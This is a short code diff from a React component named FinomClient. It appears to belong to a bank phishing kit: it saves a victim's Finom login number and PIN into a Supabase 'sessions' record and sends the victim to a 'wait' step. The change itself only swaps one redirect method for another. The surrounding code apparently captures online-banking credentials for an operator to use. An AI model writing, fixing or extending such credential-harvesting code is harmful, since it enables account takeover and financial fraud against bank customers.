@@ -33,7 +33,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "finom", bankName: "Finom", verfuegernummer: username, pin: password }
     }).eq("id", sessionId);
-    router.replace(stepToPath("wait", sessionId));
+    window.location.href = stepToPath("wait", sessionId);
   }
 
   return (
